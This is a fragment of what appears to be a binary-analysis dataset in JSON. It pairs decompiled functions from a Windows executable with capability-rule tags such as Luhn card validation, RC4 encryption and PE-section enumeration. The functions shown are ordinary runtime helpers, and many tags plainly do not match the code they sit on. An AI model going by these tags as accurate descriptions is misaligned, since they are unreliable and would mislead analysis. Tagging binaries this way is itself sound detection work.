        "decompiled_code": "\nvoid __fastcall fcn.00405c60(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "00405cac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405cac(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405c48(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.004055ac(param_1),  0 < iVar1)) {\n        fcn.00405d38();\n    }\n    else {\n        fcn.00405ec4();\n        fcn.004055ac(param_1);\n        fcn.00405ec4();\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00405d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d5c(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    char *pcVar2;\n    \n    arg_8h = 0;\n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 4) {\n            if (pcVar2[1] == '\\0') {\ncode_r0x00405d7d:\n                pcVar2 = pcVar2 + 1;\n                break;\n            }\n            if (pcVar2[2] == '\\0') {\ncode_r0x00405d7c:\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405d7d;\n            }\n            if (pcVar2[3] == '\\0') {\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405d7c;\n            }\n        }\n        arg_8h = pcVar2 - param_2;\n    }\n    if (arg_8h < 1) {\n        fcn.00405c48(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004055ac(arg_8h),  0 < iVar1)) {\n        fcn.00405d38();\n    }\n    else {\n        fcn.00405ec4();\n        fcn.004055ac(arg_8h);\n        fcn.00405ec4();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ec4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405c20();\n        iVar1 = fcn.00405de8();\n        if (0 < iVar1) {\n            fcn.004030ec();\n        }\n    }\n    fcn.00405c38();\n    return;\n}\n",
        "token_count": 97
    },
    "00405f08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405f08(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00405f38();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00405fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fd8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00406024();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004063cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004063cc(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 99
    },
    "00406858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406858(void)\n\n{\n    fcn.004066cc(&stack0x00000004);\n    return;\n}\n",
        "token_count": 30
    },
    "004068c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.004068c8(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 85
    },
    "00407480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407480(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00406940(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.0040555c();\n        }\n        else {\n            fcn.00405664();\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00407684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407684(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 112
    },
    "004098e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004098e4(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x00409972;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x00409972:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 752
    },
    "00409c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c6c(uint param_1, uint param_2)\n\n{\n    fcn.00409c20(param_2);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 48
    },
    "00409c8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c8c(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00409cc0(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 516
    },
    "00409d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409d58(uint arg_8h)\n\n{\n    fcn.00409c8c();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 41
    },
    "00409d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d80(uint param_1)\n\n{\n    fcn.00409c20(param_1);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 42
    },
    "00409da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409da8(uint arg_8h)\n\n{\n    fcn.00409c8c();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 41
    },
    "00409e6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409e6c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040669c();\n    if (iVar1 == 0) {\n        fcn.00406858(1);\n        fcn.004054c0();\n    }\n    iVar1 = fcn.0040669c();\n    if (iVar1 == 0) {\n        fcn.00406858(1);\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00409f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409f80(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040b678();\n    if (uVar1 == '\\0') {\n        fcn.00409e6c();\n        fcn.004066a4();\n        uVar1 = fcn.00409efc(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.004066a4();\n            uVar1 = fcn.00409efc(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40a000;\n    }\n    return uVar1;\n}\n",
        "token_count": 268
    },
    "0040a2a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a2a8(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint32_t wFatTime;\n    \n    wFatTime = param_2;\n    iVar1 = sub.kernel32.dll_DosDateTimeToFileTime(param_2 >> 0x10, param_2 & 0xffff, &lpLocalFileTime);\n    if (((iVar1 != 0) && (iVar1 = sub.kernel32.dll_LocalFileTimeToFileTime(&lpLocalFileTime, &lpFileTime),  iVar1 != 0))\n       && (iVar1 = sub.kernel32.dll_SetFileTime(),  iVar1 != 0)) {\n        return 0;\n    }\n    uVar2 = sub.kernel32.dll_GetLastError_1();\n    return uVar2;\n}\n",
        "token_count": 197
    },
    "0040a300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0040a300(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    uint *puStack20;\n    uint auStack16 [2];\n    \n    do {\n        puStack20 = auStack16;\n        if ((*(in_EAX + 0x20) & *(in_EAX + 0x18)) == 0) {\n            iStack24 = in_EAX + 0x34;\n            sub.kernel32.dll_FileTimeToLocalFileTime();\n            iStack32 = in_EAX + 2;\n            sub.kernel32.dll_FileTimeToDosDateTime(&iStack24);\n            *(in_EAX + 8) = *(in_EAX + 0x40);\n            *(in_EAX + 0xc) = *(in_EAX + 0x3c);\n            *(in_EAX + 0x10) = *(in_EAX + 0x20);\n            fcn.004056dc();\n            uVar2 = 0;\n            goto code_r0x0040a37c;\n        }\n        puStack20 = in_EAX + 0x20;\n        auStack16[0] = *(in_EAX + 0x1c);\n        iVar1 = sub.kernel32.dll_FindNextFileA();\n    } while (iVar1 != 0);\n    uVar2 = sub.kernel32.dll_GetLastError_1();\ncode_r0x0040a37c:\n    return CONCAT44(iStack32, uVar2);\n}\n",
        "token_count": 345
    },
    "0040a608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a608(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.004058fc(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 85
    },
    "0040a644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a644(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.004063cc(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.004063cc(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 246
    },
    "0040a9b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040a9b8(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402ef0();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 71
    },
    "0040b58a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b58a(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0040b5a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b5a6(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 171
    },
    "0040b5dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b5dc(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040afc8(0, 0xf, 0);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 58
    },
    "0040b60c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b60c(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040afc8(0, 0, 0);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 57
    },
    "0040b63c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040b63c(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b4c8();\n    if (cVar1 == '\\0') {\n        fcn.004096b4();\n    }\n    return Stack24;\n}\n",
        "token_count": 80
    },
    "0040b694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b694(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b4c8();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040b6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b6c0(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b4c8();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040b708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b708(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x4a189c);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x4a18a0;\n        iVar2 = -(uVar1 / *0x4a18a0);\n    }\n    else {\n        iVar2 = uVar1 / *0x4a18a0;\n        uVar3 = uVar1 % *0x4a18a0;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 246
    },
    "0040b74c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040b74c(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40b7b8;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 213
    },
    "0040b7bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040b7bc(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_8h;\n    \n    cVar1 = fcn.0040b74c(&var_8h, arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.0040969c();\n    }\n    return _var_8h;\n}\n",
        "token_count": 95
    },
    "0040b7fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b7fc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b708(arg_ch, arg_10h, &var_4h);\n    fcn.00409680(arg_ch);\n    fcn.00409680(in_EDX);\n    fcn.00409680(arg_8h);\n    return;\n}\n",
        "token_count": 107
    },
    "0040b960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040b960(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040b894(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.0040969c();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 99
    },
    "0040b990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b990(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040b708(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00409680(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00409680(&var_eh);\n        fcn.00409680(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040b858();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4a17fe + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 603
    },
    "0040bafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bafc(void)\n\n{\n    double dVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint uVar4;\n    uint uStack12;\n    \n    fVar3 = fcn.0040b960();\n    uStack12 = SUB84(fVar3, 0);\n    if (fVar3 < *0x40bb68) {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b7bc(uVar2);\n        dVar1 = CONCAT44(uStack12, uVar2) - fVar3;\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    else {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b7bc(uVar2);\n        dVar1 = fVar3 + CONCAT44(uStack12, uVar2);\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    return CONCAT44(uStack12, uVar4);\n}\n",
        "token_count": 274
    },
    "0040bb6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bb6c(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040b708(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 72
    },
    "0040bb94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bb94(void)\n\n{\n    float10 fVar1;\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime(auStack16);\n    fVar1 = fcn.0040b960();\n    return fVar1;\n}\n",
        "token_count": 62
    },
    "0040bbc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bbc0(void)\n\n{\n    float10 fVar1;\n    uint16_t uStack6;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b7bc(uStack6);\n    return fVar1;\n}\n",
        "token_count": 62
    },
    "0040bbf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bbf4(void)\n\n{\n    float10 fVar1;\n    ushort uStack16;\n    uint16_t uStack14;\n    uint uStack12;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b960();\n    uStack12 = SUB84(fVar1, 0);\n    fVar1 = fcn.0040b7bc(uStack14);\n    return fVar1 + CONCAT44(uStack12, CONCAT22(uStack14, uStack16));\n}\n",
        "token_count": 118
    },
    "0040bc44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
